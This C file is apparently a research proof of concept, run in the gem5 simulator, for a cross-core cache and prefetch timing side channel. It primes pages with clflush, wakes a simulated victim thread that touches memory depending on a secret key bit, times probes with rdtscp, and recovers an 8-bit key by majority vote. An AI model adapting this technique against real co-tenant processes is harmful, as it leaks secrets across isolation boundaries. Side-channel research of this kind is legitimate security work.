#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <x86intrin.h>
#include <pthread.h> // 引入多线程

#define PAGE_SIZE 4096
#define XPT_SIZE 256
#define THRESHOLD_VAL 32
#define KEY_BITS 8
#define DUMMY_SIZE 128

#define NUM_ROUNDS 7
#define CALIBRATE_SAMPLES 10

static inline void clflush(volatile void *p) { asm volatile("clflush (%0)" :: "r"(p)); }
static inline void mfence() { asm volatile("mfence" ::: "memory"); }
static inline void lfence() { asm volatile("lfence" ::: "memory"); }
static inline uint64_t rdtscp() { unsigned int junk; return __rdtscp(&junk); }

void busy_wait(int cycles) {
    for (volatile int i = 0; i < cycles; i++);
}

int compare_uint32(const void *a, const void *b) {
    return (*(uint32_t*)a - *(uint32_t*)b);
}

void train_page(volatile char *addr) {
    for (int i = 0; i < THRESHOLD_VAL + 5; i++) {
        volatile char junk = *addr; mfence();
        clflush(addr); mfence();
    }
}

void flush_hardware_state(volatile char **dummy_pages) {
    for (int i = 0; i < DUMMY_SIZE; i++) {
        volatile char junk = *dummy_pages[i]; mfence();
        clflush(dummy_pages[i]); mfence();
    }
}

// ================= 多线程同步控制变量 =================
// sync_state: 
// 0 = 初始状态，等待攻击者 Train
// 1 = 攻击者 Train 完毕，受害者执行 Access
// 2 = 受害者 Access 完毕，攻击者执行 Probe
// 3 = 测试结束，退出线程
volatile int sync_state = 0; 
volatile int shared_bit_val = 0;
volatile char *shared_victim_base = NULL;

// ================= 受害者线程 (运行在 Core 1) =================
void* victim_thread_func(void* arg) {
    while (1) {
        while (sync_state == 0 || sync_state == 2) {
            asm volatile("pause");
            if (sync_state == 3) return NULL;
        }
        if (sync_state == 3) return NULL;

        // 此时 sync_state == 1
        if (shared_bit_val) {
            volatile char *vp = shared_victim_base;
            // 增加循环次数，确保穿透 L1/L2，迫使 L3 XPT 触发驱逐
            for (int repeat = 0; repeat < 10; repeat++) { 
                clflush(vp); mfence();
                volatile char junk = *vp; mfence();
                // 稍微给硬件一点处理预取逻辑的时间
                for (volatile int d = 0; d < 50; d++); 
            }
        }

        sync_state = 2; 
    }
    return NULL;
}

// ================= 攻击者探针 (运行在 Core 0) =================
uint32_t probe_once_multi(int bit, uint8_t secret_key, 
                    volatile char **attacker_pages, 
                    volatile char **dummy_pages,
                    int dry_run) 
{
    // 在每位探测前清空一次干扰状态
    flush_hardware_state(dummy_pages);

    // 1. Setup / Training
    for (int i = 0; i < XPT_SIZE; i++) train_page(attacker_pages[i]);
    mfence();

    // 2. 唤醒受害者
    shared_bit_val = dry_run ? 0 : ((secret_key >> bit) & 1);
    sync_state = 1; 

    // 等待受害者执行完毕
    while (sync_state != 2) {
        asm volatile("pause");
    }

    // 3. Probe
    // 缩短这里的等待时间，甚至可以尝试去掉它，
    // 因为 XPT 的驱逐几乎是和受害者访存同步发生的
    busy_wait(50); 
    
    clflush(attacker_pages[0]); mfence(); lfence();
    
    uint64_t start = rdtscp();
    lfence();
    volatile char junk = *attacker_pages[0]; mfence();
    uint32_t lat = (uint32_t)(rdtscp() - start);

    sync_state = 0; 
    return lat;
}

int main(int argc, char *argv[]) {
    uint32_t threshold = 0;
    int use_fixed_threshold = 0;

    if (argc > 1) {
        threshold = (uint32_t)atoi(argv[1]);
        use_fixed_threshold = 1;
    }

    uint8_t secret_key = 0x00; 
    size_t mem_size = 4000 * PAGE_SIZE; 
    char *buffer = (char *)aligned_alloc(PAGE_SIZE, mem_size);
    memset(buffer, 0x55, mem_size);

    volatile char *attacker_pages[XPT_SIZE];
    for (int i = 0; i < XPT_SIZE; i++) attacker_pages[i] = &buffer[i * PAGE_SIZE];
    
    shared_victim_base = &buffer[1000 * PAGE_SIZE]; // 设置全局共享的受害者地址
    
    volatile char *dummy_pages[DUMMY_SIZE];
    for (int i = 0; i < DUMMY_SIZE; i++) dummy_pages[i] = &buffer[(2000 + i) * PAGE_SIZE];

    // --- 启动受害者线程 (将被 gem5 映射到 Core 1) ---
    pthread_t victim_tid;
    pthread_create(&victim_tid, NULL, victim_thread_func, NULL);

    int vote_box[KEY_BITS] = {0};

    printf("=== XPT MULTI-CORE ATTACK (Attacker:Core0, Victim:Core1) ===\n");
    printf("Target Key: 0x%02x\n\n", secret_key);

    // --- 第一步：校准 ---
    if (!use_fixed_threshold) {
        printf("[*] Calibrating Base Latency...\n");
        uint32_t cal_samples[CALIBRATE_SAMPLES];
        for(int i = 0; i < CALIBRATE_SAMPLES; i++) {
            cal_samples[i] = probe_once_multi(0, 0, attacker_pages, dummy_pages, 1);
            printf("  Sample %02d: %u\n", i + 1, cal_samples[i]);
        }

        qsort(cal_samples, CALIBRATE_SAMPLES, sizeof(uint32_t), compare_uint32);
        uint32_t fast_median = cal_samples[CALIBRATE_SAMPLES / 2];
        threshold = fast_median + 25; 
        printf("RESULT_THRESHOLD:%u\n", threshold);
    } else {
        printf("[*] Using Oracle Threshold: %u\n", threshold);
    }

    // --- 第二步：多轮全扫描 ---
    for (int r = 0; r < NUM_ROUNDS; r++) {
        printf("Round %02d: ", r + 1);
        for (int b = KEY_BITS-1; b >= 0; b--) {
            uint32_t lat = probe_once_multi(b, secret_key, attacker_pages, dummy_pages, 0);
            
            int is_one = (lat > threshold) ? 1 : 0;
            vote_box[b] += is_one;
            printf("%d(%u) ", is_one, lat); 
        }
        printf("\n");
    }

    // --- 结束受害者线程 ---
    sync_state = 3; 
    pthread_join(victim_tid, NULL);

    // --- 第三步：多数表决 ---
    uint8_t recovered = 0;
    printf("\n=== FINAL VOTING RESULTS ===\n");
    for (int b = 0; b < KEY_BITS; b++) {
        int final_guess = (vote_box[b] > (NUM_ROUNDS / 2)) ? 1 : 0;
        if (final_guess) recovered |= (1 << b);
        
        printf("Bit %d | Votes: %2d/%2d | Final: %d | %s\n", 
               b, vote_box[b], NUM_ROUNDS, final_guess, 
               (final_guess == ((secret_key >> b) & 1) ? "OK" : "FAIL"));
    }

    printf("\nRecovered Key: 0x%02x (Target: 0x%02x)\n", recovered, secret_key);

    free(buffer);
    return 0;
}